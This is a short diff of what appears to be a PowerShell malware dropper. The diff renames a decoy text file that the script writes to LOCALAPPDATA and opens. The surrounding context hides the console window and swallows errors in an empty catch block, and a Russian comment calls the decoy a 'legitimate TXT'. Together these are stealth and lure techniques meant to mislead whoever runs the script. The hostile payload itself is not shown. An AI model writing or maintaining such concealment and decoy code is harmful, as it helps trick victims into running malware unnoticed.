@@ -9,7 +9,7 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
 # СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
-$fileName = "МСД 2026.txt"
+$fileName = "TZForDezHelp.txt"
 $filePath = Join-Path $env:LOCALAPPDATA $fileName
 
 $content = @"
@@ -94,6 +94,7 @@ try {
 catch {
 	
 }
+
 
 
 exit
